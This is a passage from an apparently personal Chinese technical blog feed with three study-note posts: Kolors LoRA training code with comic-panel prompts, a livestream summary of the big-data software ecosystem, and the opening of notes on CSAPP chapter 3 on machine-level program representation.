class="line"><span class="comment"># 下载可图模型</span></span><br><span class="line"><span class="keyword">from</span> diffsynth <span class="keyword">import</span> download_models <span class="comment"># 导入download_models</span></span><br><span class="line">download_models([<span class="string">&quot;Kolors&quot;</span>, <span class="string">&quot;SDXL-vae-fp16-fix&quot;</span>]) <span class="comment"># 下载可图模型</span></span><br><span class="line"><span class="comment"># DiffSynth-Studio提供了可图的Lora训练脚本，查看脚本信息</span></span><br><span class="line">!python DiffSynth-Studio/examples/train/kolors/train_kolors_lora.py -h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行可图Lora训练</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">python DiffSynth-Studio/examples/train/kolors/train_kolors_lora.py \ # 选择使用可图的Lora训练脚本DiffSynth-Studio/examples/train/kolors/train_kolors_lora.py</span></span><br><span class="line"><span class="string">  --pretrained_unet_path models/kolors/Kolors/unet/diffusion_pytorch_model.safetensors \ # 选择unet模型</span></span><br><span class="line"><span class="string">  --pretrained_text_encoder_path models/kolors/Kolors/text_encoder \ # 选择text_encoder</span></span><br><span class="line"><span class="string">  --pretrained_fp16_vae_path models/sdxl-vae-fp16-fix/diffusion_pytorch_model.safetensors \ # 选择vae模型</span></span><br><span class="line"><span class="string">  --lora_rank 16 \ # lora_rank 16 表示在权衡模型表达能力和训练效率时，选择了使用 16 作为秩，适合在不显著降低模型性能的前提下，通过 LoRA 减少计算和内存的需求</span></span><br><span class="line"><span class="string">  --lora_alpha 4.0 \ # 设置 LoRA 的 alpha 值，影响调整的强度</span></span><br><span class="line"><span class="string">  --dataset_path data/lora_dataset_processed \ # 指定数据集路径，用于训练模型</span></span><br><span class="line"><span class="string">  --output_path ./models \ # 指定输出路径，用于保存模型</span></span><br><span class="line"><span class="string">  --max_epochs 1 \ # 设置最大训练轮数为 1</span></span><br><span class="line"><span class="string">  --center_crop \ # 启用中心裁剪，这通常用于图像预处理</span></span><br><span class="line"><span class="string">  --use_gradient_checkpointing \ # 启用梯度检查点技术，以节省内存</span></span><br><span class="line"><span class="string">  --precision &quot;16-mixed&quot; # 指定训练时的精度为混合 16 位精度（half precision），这可以加速训练并减少显存使用</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip()</span><br><span class="line">os.system(cmd) <span class="comment"># 执行可图Lora训练</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载lora微调后的模型</span></span><br><span class="line"><span class="keyword">from</span> diffsynth <span class="keyword">import</span> ModelManager, SDXLImagePipeline <span class="comment"># 导入ModelManager和SDXLImagePipeline</span></span><br><span class="line"><span class="keyword">from</span> peft <span class="keyword">import</span> LoraConfig, inject_adapter_in_model <span class="comment"># 导入LoraConfig和inject_adapter_in_model</span></span><br><span class="line"><span class="keyword">import</span> torch <span class="comment"># 导入torch</span></span><br><span class="line"><span class="comment"># 加载LoRA配置并注入模型</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_lora</span>(<span class="params">model, lora_rank, lora_alpha, lora_path</span>):</span><br><span class="line">    lora_config = LoraConfig(</span><br><span class="line">        r=lora_rank, <span class="comment"># 设置LoRA的秩(rank)</span></span><br><span class="line">        lora_alpha=lora_alpha, <span class="comment"># 设置LoRA的alpha值，控制LoRA的影响权重</span></span><br><span class="line">        init_lora_weights=<span class="string">&quot;gaussian&quot;</span>, <span class="comment"># 初始化LoRA权重为高斯分布</span></span><br><span class="line">        target_modules=[<span class="string">&quot;to_q&quot;</span>, <span class="string">&quot;to_k&quot;</span>, <span class="string">&quot;to_v&quot;</span>, <span class="string">&quot;to_out&quot;</span>], <span class="comment"># 指定要应用LoRA的模块</span></span><br><span class="line">    )</span><br><span class="line">    model = inject_adapter_in_model(lora_config, model) <span class="comment"># 将LoRA配置注入到模型中</span></span><br><span class="line">    state_dict = torch.load(lora_path, map_location=<span class="string">&quot;cpu&quot;</span>) <span class="comment"># 加载LoRA微调后的权重</span></span><br><span class="line">    model.load_state_dict(state_dict, strict=<span class="literal">False</span>) <span class="comment"># 将权重加载到模型中，允许部分权重不匹配</span></span><br><span class="line">    <span class="keyword">return</span> model <span class="comment"># 返回注入LoRA后的模型</span></span><br><span class="line"><span class="comment"># 加载预训练模型</span></span><br><span class="line">model_manager = ModelManager(</span><br><span class="line">    torch_dtype=torch.float16, <span class="comment"># 设置模型的数据类型为float16，减少显存占用</span></span><br><span class="line">    device=<span class="string">&quot;cuda&quot;</span>, <span class="comment"># 指定使用GPU进行计算</span></span><br><span class="line">    file_path_list=[</span><br><span class="line">        <span class="string">&quot;models/kolors/Kolors/text_encoder&quot;</span>, <span class="comment"># 文本编码器的路径</span></span><br><span class="line">        <span class="string">&quot;models/kolors/Kolors/unet/diffusion_pytorch_model.safetensors&quot;</span>, <span class="comment"># UNet模型的路径</span></span><br><span class="line">        <span class="string">&quot;models/kolors/Kolors/vae/diffusion_pytorch_model.safetensors&quot;</span> <span class="comment"># VAE模型的路径</span></span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 初始化图像生成管道</span></span><br><span class="line">pipe = SDXLImagePipeline.from_model_manager(model_manager) <span class="comment"># 从模型管理器中加载模型并初始化管道</span></span><br><span class="line"><span class="comment"># 加载并应用LoRA权重到UNet模型</span></span><br><span class="line">pipe.unet = load_lora(</span><br><span class="line">    pipe.unet, </span><br><span class="line">    lora_rank=<span class="number">16</span>, <span class="comment"># 设置LoRA的秩(rank)，与训练脚本中的参数保持一致</span></span><br><span class="line">    lora_alpha=<span class="number">2.0</span>, <span class="comment"># 设置LoRA的alpha值，控制LoRA对模型的影响权重</span></span><br><span class="line">    lora_path=<span class="string">&quot;models/lightning_logs/version_0/checkpoints/epoch=0-step=500.ckpt&quot;</span> <span class="comment"># 指定LoRA权重的文件路径</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成图像</span></span><br><span class="line">torch.manual_seed(<span class="number">0</span>) <span class="comment"># 设置随机种子，确保生成的图像具有可重复性。如果想要每次生成不同的图像，可以将种子值改为随机值。</span></span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，一个紫色短发小女孩，在家中沙发上坐着，双手托着腮，很无聊，全身，粉色连衣裙&quot;</span>, <span class="comment"># 设置正向提示词，用于指导模型生成图像的内容</span></span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span>, <span class="comment"># 设置负向提示词，模型会避免生成包含这些特征的图像</span></span><br><span class="line">    cfg_scale=<span class="number">4</span>, <span class="comment"># 设置分类自由度 (Classifier-Free Guidance) 的比例，数值越高，模型越严格地遵循提示词</span></span><br><span class="line">    num_inference_steps=<span class="number">50</span>, <span class="comment"># 设置推理步数，步数越多，生成的图像细节越丰富，但生成时间也更长</span></span><br><span class="line">    height=<span class="number">1024</span>, width=<span class="number">1024</span>, <span class="comment"># 设置生成图像的高度和宽度，这里生成 1024x1024 像素的图像</span></span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;1.jpg&quot;</span>) <span class="comment"># 将生成的图像保存为 &quot;1.jpg&quot; 文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 图像拼接，展示总体拼接大图</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  <span class="comment"># 导入numpy库，用于处理数组和数值计算</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  <span class="comment"># 导入PIL库中的Image模块，用于图像处理</span></span><br><span class="line">images = [np.array(Image.<span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.jpg&quot;</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>)]  <span class="comment"># 读取1.jpg到8.jpg的图像，转换为numpy数组，并存储在列表images中</span></span><br><span class="line">image = np.concatenate([  <span class="comment"># 将四组图像在垂直方向上拼接</span></span><br><span class="line">    np.concatenate(images[<span class="number">0</span>:<span class="number">2</span>], axis=<span class="number">1</span>),  <span class="comment"># 将第1组（images[0:2]）的两张图像在水平方向上拼接</span></span><br><span class="line">    np.concatenate(images[<span class="number">2</span>:<span class="number">4</span>], axis=<span class="number">1</span>),  <span class="comment"># 将第2组（images[2:4]）的两张图像在水平方向上拼接</span></span><br><span class="line">    np.concatenate(images[<span class="number">4</span>:<span class="number">6</span>], axis=<span class="number">1</span>),  <span class="comment"># 将第3组（images[4:6]）的两张图像在水平方向上拼接</span></span><br><span class="line">    np.concatenate(images[<span class="number">6</span>:<span class="number">8</span>], axis=<span class="number">1</span>),  <span class="comment"># 将第4组（images[6:8]）的两张图像在水平方向上拼接</span></span><br><span class="line">], axis=<span class="number">0</span>)  <span class="comment"># 将四组拼接后的图像在垂直方向上拼接</span></span><br><span class="line">image = Image.fromarray(image).resize((<span class="number">1024</span>, <span class="number">2048</span>))  <span class="comment"># 将拼接后的numpy数组转换为图像对象，并调整大小为1024x2048像素</span></span><br><span class="line">image  <span class="comment"># 输出最终生成的图像对象，用于显示图像</span></span><br></pre></td></tr></table></figure>
<h4 id="使用通义千问对代码疑问处进行追问"><a class="header-anchor" href="#使用通义千问对代码疑问处进行追问">¶</a>使用通义千问对代码疑问处进行追问</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">我对其中&#123;替换成你的问题&#125;还是不太理解，给我再详细介绍一下</span><br></pre></td></tr></table></figure>
<h3 id="实战——基于话剧的连环画制作"><a class="header-anchor" href="#实战——基于话剧的连环画制作">¶</a>实战——基于话剧的连环画制作</h3>
<h4 id="1-数据准备"><a class="header-anchor" href="#1-数据准备">¶</a>1. 数据准备</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">你是一个文生图专家，我们现在要做一个实战项目，就是要编排一个文生图话剧</span><br><span class="line">话剧由<span class="number">8</span>张场景图片生成，你需要输出每张图片的生图提示词</span><br><span class="line"></span><br><span class="line">具体的场景图片</span><br><span class="line"><span class="number">1</span>、女主正在上课</span><br><span class="line"><span class="number">2</span>、开始睡着了</span><br><span class="line"><span class="number">3</span>、进入梦乡，梦到自己站在路旁</span><br><span class="line"><span class="number">4</span>、王子骑马而来</span><br><span class="line"><span class="number">5</span>、两人相谈甚欢</span><br><span class="line"><span class="number">6</span>、一起坐在马背上</span><br><span class="line"><span class="number">7</span>、下课了，梦醒了</span><br><span class="line"><span class="number">8</span>、又回到了学习生活中</span><br><span class="line"></span><br><span class="line">生图提示词要求</span><br><span class="line"><span class="number">1</span>、风格为古风</span><br><span class="line"><span class="number">2</span>、根据场景确定是使用全身还是上半身</span><br><span class="line"><span class="number">3</span>、人物描述</span><br><span class="line"><span class="number">4</span>、场景描述</span><br><span class="line"><span class="number">5</span>、做啥事情</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">古风，水墨画，一个黑色长发少女，坐在教室里，盯着黑板，深思，上半身，红色长裙</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>在询问的基础上进行多次调整，打磨出最佳提示词</p>
</li>
<li>
<p>最后的话剧场景</p>
</li>
</ul>
<table>
<thead>
<tr>
<th><strong>图片编号</strong></th>
<th><strong>场景描述</strong></th>
<th><strong>正向提示词</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>图片1</td>
<td>女主正在上课</td>
<td>古风，水墨画，一个黑色长发少女，坐在教室里，盯着黑板，深思，上半身，红色长裙</td>
</tr>
<tr>
<td>图片2</td>
<td>开始睡着了</td>
<td>古风，水墨画，一个黑色长发少女，坐在教室里，趴在桌子上睡着了，上半身，红色长裙</td>
</tr>
<tr>
<td>图片3</td>
<td>进入梦乡，梦到自己站在路旁</td>
<td>古风，水墨画，一个黑色长发少女，站在路边，上半身，红色长裙</td>
</tr>
<tr>
<td>图片4</td>
<td>王子骑马而来</td>
<td>古风，水墨画，一个英俊少年，骑着白马，上半身，白色衬衫</td>
</tr>
<tr>
<td>图片5</td>
<td>两人相谈甚欢</td>
<td>古风，水墨画，一个英俊少年，白色衬衫，一个黑色长发少女，红色长裙，两个人一起聊天，开心，上半身</td>
</tr>
<tr>
<td>图片6</td>
<td>一起坐在马背上</td>
<td>古风，水墨画，一个英俊少年，白色衬衫，一个黑色长发少女，红色长裙，两个人一起骑着马，全身</td>
</tr>
<tr>
<td>图片7</td>
<td>下课了，梦醒了</td>
<td>古风，水墨画，一个黑色长发少女，坐在教室里，下课铃声响了，同学们开始走动，从睡梦中醒来，深思，上半身，红色长裙</td>
</tr>
<tr>
<td>图片8</td>
<td>又回到了学习生活中</td>
<td>古风，水墨画，一个黑色长发少女，坐在教室里，盯着黑板，认真上课，上半身，红色长裙</td>
</tr>
</tbody>
</table>
<h4 id="2-执行"><a class="header-anchor" href="#2-执行">¶</a>2. 执行</h4>
<ul>
<li>在<a href="https://datawhaler.feishu.cn/wiki/CMYkwKow0ihxOikg1G9cd9Zhnng">从零入门AI生图原理&amp;实践</a> 的基础上</li>
</ul>
<h4 id="3-提示词修改"><a class="header-anchor" href="#3-提示词修改">¶</a>3. 提示词修改</h4>
<ol>
<li>双击进入baseline文件</li>
<li>找到生成图像的板块</li>
<li>依次替换8张图片的正向提示词和反向提示词</li>
</ol>
<h3 id="浅尝scepter-webui"><a class="header-anchor" href="#浅尝scepter-webui">¶</a>浅尝scepter webui</h3>
<ul>
<li>
<p>魔搭体验网址：<a href="https://www.modelscope.cn/studios/iic/scepter_studio">https://www.modelscope.cn/studios/iic/scepter_studio</a></p>
</li>
<li>
<p>核心组件</p>
<ul>
<li><a href="https://github.com/modelscope/scepter#tutorials">生成训练和推理框架</a></li>
<li><a href="https://github.com/modelscope/scepter#currently-supported-approaches">轻松实施流行方法</a></li>
<li><a href="https://github.com/modelscope/scepter#launch">交互式用户界面：SCEPTER Studio</a></li>
</ul>
</li>
</ul>
<h3 id="有挑战：私有部署"><a class="header-anchor" href="#有挑战：私有部署">¶</a>有挑战：私有部署</h3>
<ul>
<li><strong><a href="https://modelscope.cn/">魔搭社区</a><strong>提供的体验地址里面</strong>缺失了微调模型</strong>的功能，如果大家希望能使用secpter完整的功能，我们可以将其私有部署到我们自己的服务器。</li>
<li>**github地址：**<a href="https://github.com/modelscope/scepter">https://github.com/modelscope/scepter</a></li>
<li>突然想起上个月买的还不太会用的华为云服务器（提醒一下自分T T</li>
</ul>
<h3 id="一些参考链接"><a class="header-anchor" href="#一些参考链接">¶</a>一些参考链接</h3>
<ol>
<li><a href="https://www.digitaling.com/articles/398713.html">壹沓AI观察：DALL-E——人工智能让“达利”再世</a></li>
<li>《AIGC未来已来》</li>
<li><a href="https://www.36kr.com/p/1722558431233">AI时代不得不提的“恐怖谷”</a></li>
<li><a href="https://www.woshipm.com/share/6066183.html">AI绘画的发展历史（GAN、diffusion、VAE…) </a></li>
<li><a href="https://mp.weixin.qq.com/s/4j_VPsf1fwkG7HJxOl5dnA">AI绘画很快就能骗过整个互联网了。。。</a></li>
</ol>
<h3 id="自分の尝试"><a class="header-anchor" href="#自分の尝试">¶</a>自分の尝试</h3>
<ul>
<li>根据以前的梦境编了一个故事，没想到给的提示词和画面描述还挺切合（笑</li>
<li>（碎碎念：看到一个玄学：当某个人进入梦中，说明此生再无缘分啦&gt;-&lt;</li>
</ul>
<table>
<thead>
<tr>
<th><strong>图片编号</strong></th>
<th><strong>场景描述</strong></th>
<th><strong>正向提示词</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>图片1</td>
<td>女主正在躲避追杀，进入一座小楼</td>
<td>现代，二次元，赛博朋克，年轻女性，黑色长发，穿着战斗装备，眼神警惕，昏暗的街道，霓虹灯闪烁，一座破旧的小楼入口，快速闪入楼内，回头一瞥</td>
</tr>
<tr>
<td>图片2</td>
<td>女主在逃跑中，看到楼上的灯光</td>
<td>现代，二次元，赛博朋克，年轻女性，黑色长发，战斗装备，表情紧张，阴暗的街道，远处高楼窗户透出的微弱灯光，奔跑中抬头看光</td>
</tr>
<tr>
<td>图片3</td>
<td>跑到二楼，看见想见到的人</td>
<td>现代，二次元，赛博朋克，年轻女性与男性，均着战斗装备，表情惊喜，二楼走廊，灯光昏暗，屏幕发出蓝光，停下脚步，惊讶地看向对方</td>
</tr>
<tr>
<td>图片4</td>
<td>两人从缝隙中望向楼下，已经是一片战后的残骸</td>
<td>现代，二次元，赛博朋克，年轻女性与男性，战斗装备，眼神凝重，二楼的隐蔽角落，通过缝隙可以看到楼下的废墟，蹲伏，透过缝隙向下窥视</td>
</tr>
<tr>
<td>图片5</td>
<td>两人相对而坐，确认对方的安全，眼里有泪</td>
<td>现代，二次元，赛博朋克，年轻女性与男性，战斗装备，眼含泪水，一间破旧的房间，窗外是探测器的红光，房间内仅有微弱的光线，面对面坐着，彼此确认安全</td>
</tr>
<tr>
<td>图片6</td>
<td>两个人手牵着手，坐在地面上，疲倦而安静</td>
<td>现代，二次元，赛博朋克，年轻女性与男性，战斗装备，疲惫表情，一间简陋的避难所，周围是电子设备和武器，手牵手，坐在地上，身体放松</td>
</tr>
<tr>
<td>图片7</td>
<td>在通往二楼的道路上响起枪炮声，两人静静等待结局</td>
<td>现代，二次元，赛博朋克，年轻女性与男性，战斗装备，表情坚定，狭窄的楼梯间，墙壁破损，背靠墙壁，保持沉默</td>
</tr>
<tr>
<td>图片8</td>
<td>梦醒，有点失落</td>
<td>现代，二次元，赛博朋克，年轻女性，黑色短发，穿着睡衣，神情忧郁，一间简陋的卧室，窗外是霓虹闪烁的城市夜景，坐在床边，低头沉思</td>
</tr>
</tbody>
</table>
<ul>
<li>评价：有点人工智障。。。。</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>AI notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>【大数据】直播记录</title>
    <url>/2024/07/26/CS_Notes/BidData/%E3%80%90%E5%A4%A7%E6%95%B0%E6%8D%AE%E3%80%91%E7%9B%B4%E6%92%AD%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<h2 id="大数据行业发展，未来前景"><a class="header-anchor" href="#大数据行业发展，未来前景">¶</a>大数据行业发展，未来前景</h2>
<h3 id="大数据的诞生"><a class="header-anchor" href="#大数据的诞生">¶</a>大数据的诞生</h3>
<ul>
<li>
<p>大数据的诞生和信息化以及互联网的发展密切相关</p>
</li>
<li>
<p>上世纪70年代→逐步出现了基于TCP/IP协议的小规模的计算机互联互通，多为军事、科研用途</p>
</li>
<li>
<p>上世纪90年代→全球互联的互联网出现，个人企业均可参与，真正逐步实现全球互联</p>
</li>
<li>
<p>2000年后，互联网上的商业行为剧增。在互联网参与者众多的前提下，商业公司、科研单位等，所能获得的数据量剧增</p>
</li>
<li>
<p>剧增的数据量和羸弱的单机性能→让许多科技公司开始尝试以<strong>数量</strong>来解决问题</p>
</li>
<li>
<p>→<strong>分布式处理技术</strong>诞生</p>
</li>
</ul>
<h3 id="分布式处理技术"><a class="header-anchor" href="#分布式处理技术">¶</a>分布式处理技术</h3>
<ul>
<li>在<strong>数据量巨大</strong>的基础下，以服务器的<strong>数量</strong>来解决大规模数据处理问题</li>
</ul>
<h4 id="分布式处理技术的逐步演化"><a class="header-anchor" href="#分布式处理技术的逐步演化">¶</a>分布式处理技术的逐步演化</h4>
<ul>
<li>
<p>大规模服务器集群下的<strong>大规模数据存储【存】</strong></p>
</li>
<li>
<p>大规模服务器集群下的<strong>大规模数据计算【用】</strong></p>
</li>
<li>
<p>大规模服务器集群下的<strong>大规模数据传输技术【传】</strong></p>
</li>
<li>
<p>08年前分布式技术基本上还处于大企业内部专用且不够成熟</p>
</li>
<li>
<p>08年<strong>Apache Hadoop</strong>开源，广大企业拥有了成熟的、 开源的分布式数据处理解决<strong>方案</strong></p>
</li>
</ul>
<h4 id="大数据的诞生-v2"><a class="header-anchor" href="#大数据的诞生-v2">¶</a>大数据的诞生</h4>
<ul>
<li><strong>Apache Hadoop</strong>是一款开源的分布式处理技术栈，提供了：
<ul>
<li>基于Hadoop HDFS的：分布式数据存储技术</li>
<li>基于Hadoop MapReduce的：分布式数据计算技术</li>
<li>基于Hadoop YARN的：分布式资源调度技术</li>
</ul>
</li>
</ul>
<h4 id="什么是大数据"><a class="header-anchor" href="#什么是大数据">¶</a>什么是大数据</h4>
<ul>
<li>大数据的出现，本质上是为了解决海量数据的处理难题</li>
<li>大数据就是→
<ul>
<li><u><strong>使用分布式技术完成海量数据的处理，得到数据背后蕴含的价值【狭义的（技术思维的）】</strong></u></li>
<li><u><strong>广义的↓</strong></u></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>海量的数据</th>
<th>数字时代人人联网，日常活动产生的数据记录是海量的，背后蕴含的价值也是巨大的</th>
</tr>
</thead>
<tbody>
<tr>
<td>基础设施</td>
<td>大数据在技术上，是数字化时代的基础设施。数字化时代的发展离不开大数据技术的支持</td>
</tr>
<tr>
<td>生活</td>
<td>警务、政务、工业、电商、金融、能源、物流、通讯、科研、教育等。大数据已经渗入生活方方面面</td>
</tr>
</tbody>
</table>
<ul>
<li>狭义上：大数据是一类<strong>技术栈</strong>，是一种用来处理海量数据的<strong>软件技术体系</strong></li>
<li>广义上：大数据是数字化时代、信息化时代的<strong>基础（技术）支撑</strong>，以数据<strong>为生活赋能</strong></li>
<li>学习阶段学习的是狭义的大数据技术栈</li>
<li>工作时广义上为生活赋能</li>
</ul>
<h4 id="大数据软件生态"><a class="header-anchor" href="#大数据软件生态">¶</a>大数据软件生态</h4>
<ul>
<li>分为三大核心工作体系
<ul>
<li><strong>数据存储</strong></li>
<li><strong>数据计算</strong></li>
<li><strong>数据传输</strong></li>
</ul>
</li>
</ul>
<h4 id="数据存储"><a class="header-anchor" href="#数据存储">¶</a>数据存储</h4>
<h5 id="SQL"><a class="header-anchor" href="#SQL">¶</a>SQL</h5>
<ul>
<li>
<p>SQL (Structured Query Language)</p>
<ul>
<li>结构化查询语言，是所有关系型数据库的规范</li>
<li>关系型数据库
<ul>
<li>mysql</li>
<li>oracle</li>
<li>sqlserver</li>
<li>…</li>
</ul>
</li>
</ul>
</li>
<li>
<p>NoSQL：不仅仅是SQL</p>
<ul>
<li>SQL主要强调以<strong>二维的表格</strong>存储数据</li>
<li>NoSQL主要强调以<strong>键值对</strong>形式（KV）存储数据
<ul>
<li>java→map集合    python→dict字典</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="大数据软件生态→数据存储"><a class="header-anchor" href="#大数据软件生态→数据存储">¶</a>大数据软件生态→数据存储</h5>
<ul>
<li>
<p>Apache Hadoop -HDFS</p>
<ul>
<li>Apache Hadoop框架内的组件HDFS是大数据体系中使用最为广泛的分布式存储结束</li>
</ul>
</li>
<li>
<p>Apache HBase</p>
<ul>
<li>Apache HBase是大数据体系内使用非常广泛的NoSQL KV型数据库技术</li>
<li>HBase是基于HDFS之上构建的</li>
</ul>
</li>
<li>
<p>Apache KUDU</p>
<ul>
<li>Apache Kudu同样为大数据体系中使用较多的分布式存储引擎</li>
</ul>
</li>
<li>
<p>云平台存储组件</p>
<ul>
<li>除此外，各大云平台厂商也有相应的大数据存储组件</li>
<li>如：阿里云的OSS、UCloud的US3、AWS的S3、金山云的KS3等等</li>
</ul>
</li>
</ul>
<h4 id="数据计算"><a class="header-anchor" href="#数据计算">¶</a>数据计算</h4>
<ul>
<li>Apache Hadoop -MapReduce
<ul>
<li>Apache Hadoop的MapReduce组件是最早一代的大数据分布式计算引擎对大数据的发展做出了卓越贡献</li>
<li>Java语言写的</li>
</ul>
</li>
<li>Apache Hive
<ul>
<li>Apache Hive是一款以SQL为主要开发语言的分布式计算框架</li>
<li>其底层使用了Hadoop的MapReduce技术</li>
<li>Apache Hive至今仍活跃在大数据一线，被许多公司使用</li>
<li>写的是SQL语句，背后运行的是MapReduce程序</li>
<li>相比用MapReduce，工作量少了很多</li>
</ul>
</li>
<li>Apache Spark
<ul>
<li>Apache Spark是目前全球范围内最火热的分布式内存计算引擎，是大数据体系中的明星计算产品</li>
<li>速度更快，因为主要基于内存，不够的时候会用一部分磁盘；</li>
<li>而MapReduce是基于磁盘内存不断进行IO操作</li>
</ul>
</li>
<li>Apache Flink
<ul>
<li>Apache Flink同样也是一款明星级的大数据分布式内存计算引擎</li>
<li>特别是在实时计算（流计算）领域占据了大多数国内市场</li>
<li>例：阿里双11 大屏显示实时数据 用的就是Flink</li>
<li>目前Flink也是阿里在维护，阿里是国内最大用户</li>
<li>因为可以支持实时计算显示，所以成本较高，目前市占率较小</li>
</ul>
</li>
</ul>
<h4 id="数据传输"><a class="header-anchor" href="#数据传输">¶</a>数据传输</h4>
<ul>
<li>
<p>Apache Sqoop</p>
<ul>
<li>Apache Sqoop是一款ETL工具，可以协助大数据体系和关系型数据库之间进行数据传输</li>
<li>ETL：对数据进行抽取、转换、加载的过程</li>
<li>有个岗位叫ETL工程师</li>
<li>阿里出的一个工具datax也是一个ETL工具</li>
<li>用的比较多的ETL根据：Sqoop和datax</li>
</ul>
</li>
<li>
<p>Apache Flume</p>
<ul>
<li>Apache Flume是一款【流式】数据采集工具，可以从非常多的数据源中完成数据采集传输任务</li>
</ul>
</li>
<li>
<p>Apache Kafka</p>
<ul>
<li>Apache Kafka是一款分布式的消息系统，可以完成海量规模的数据传输工作</li>
<li>Apache Kafka在大数据领域也是明星产品</li>
</ul>
</li>
<li>
<p>Apache Pulsar</p>
<ul>
<li>Apache Pulsar同样是一款分布式的消息系统</li>
<li>在大数据领域同样有非常多使用者</li>
</ul>
</li>
</ul>
<h4 id="小结"><a class="header-anchor" href="#小结">¶</a>小结</h4>
<h5 id="学习阶段"><a class="header-anchor" href="#学习阶段">¶</a>学习阶段</h5>
<ul>
<li>学习狭义的大数据技术栈</li>
</ul>
<h5 id="大数据核心工作"><a class="header-anchor" href="#大数据核心工作">¶</a>大数据核心工作</h5>
<ul>
<li>利用数据存储技术栈解决海量的数据存储问题</li>
<li>利用数据计算技术栈解决海量的数据计算问题</li>
<li>利用数据传输技术栈解决海量的数据传输问题</li>
</ul>
<h2 id="大数据学习规划"><a class="header-anchor" href="#大数据学习规划">¶</a>大数据学习规划</h2>
<p>此处缺一张图  72:35</p>
<p>此处还缺一张图  75:37</p>
<p>此处又缺一张图  78:49</p>
<p>81:09</p>
<p>81:49</p>
<p>103:36</p>
<h2 id="大学生秋季招聘"><a class="header-anchor" href="#大学生秋季招聘">¶</a>大学生秋季招聘</h2>
<ul>
<li>大学生就业服务平台</li>
<li>高效人才网</li>
<li>国聘网</li>
<li>中国国家人才网</li>
<li>中国人力资源开发网</li>
<li>中国就业网</li>
<li>各大企业官网、公众号</li>
<li>不止在boss直聘上</li>
<li>简历上不要写qq邮箱</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>【CSAPP】第三章 程序的机器级表示</title>
    <url>/2024/07/24/CS_Notes/CSAPP/%E3%80%90CSAPP%E3%80%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>学pwn的过程中被建议是看CSAPP的第三章</p>
<ul>
<li>宝藏链接
<ul>
<li><a href="https://fengmuzi2003.gitbook.io/csapp3e/di-3-zhang-ji-qi-ji-bian-cheng">第03章：程序的机器级表示 | CSAPP重点解读 (gitbook.io)</a>  这个是第三章的别人做好的笔记，可以参考着看</li>
<li><a href="https://wdxtub.com/work/">不周山作品集 | 小土刀 2.0 (wdxtub.com)</a></li>
</ul>
</li>
</ul>
<h3 id="序"><a class="header-anchor" href="#序">¶</a>序</h3>
<ul>
<li>
<p>因为对于概念还是有点模糊，所以笔记上我就选择摘抄理解了先。。。到实践部分再搞别的形式。。</p>
</li>
<li>
<p>使用高级语言编程时，机器屏蔽了程序的细节，即机器级的实现；</p>
<ul>
<li>用汇编代码编程的时候，程序员必须指定程序用来执行计算的低级指令</li>
</ul>
</li>
<li>
<p>汇编代码最大的优点：</p>
<ul>
<li>用高级语言编写的程序可以在很多不同的机器上编译和执行</li>
<li>汇编代码则是与特定机器密切相关</li>
</ul>
</li>
<li>
<p>对于汇编代码：</p>
<ul>
<li>能够阅读和理解</li>
</ul>
</li>
<li>
<p>阅读汇编代码的好处：</p>
<ul>
<li>能够理解编译器的优化能力</li>
<li>分析代码中隐含的低效率</li>
<li>从而最大化一段关键代码性能</li>
</ul>
</li>
<li>
<p>需要具备程序机器级的知识</p>
<ul>
<li>许多攻击利用了系统程序中的漏洞重写信息，从而获得了系统的控制权</li>
<li>了解这些漏洞如何出现以及如何防御他们</li>
</ul>
</li>
<li>
<p>了解如何将C程序编译成这种形式的机器代码</p>
<ul>
<li>优化编译器能够
<ul>
<li>重新排列执行顺序</li>
<li>消除不必要的计算</li>
<li>用快速操作替换慢速操作</li>
<li>甚至将递归计算变换成迭代计算</li>
</ul>
</li>
</ul>
</li>
<li>
<p>逆向工程（reverse engineering）</p>
<ul>
<li>通过研究系统和逆向工程，来试图了解系统的创建过程</li>
<li>此处的<strong>系统</strong>是一个<strong>机器产生的汇编语言程序</strong></li>
</ul>
</li>
<li>
<p><strong>x86-64</strong></p>
<ul>
<li>是现在笔记本电脑和台式机中最常见处理器的机器语言</li>
<li>也是驱动大型数据中心和超级计算机的最常见处理器的机器语言</li>
</ul>
</li>
<li>
<p><strong>IA32编程</strong></p>
<ul>
<li>x86-64的32位前身</li>
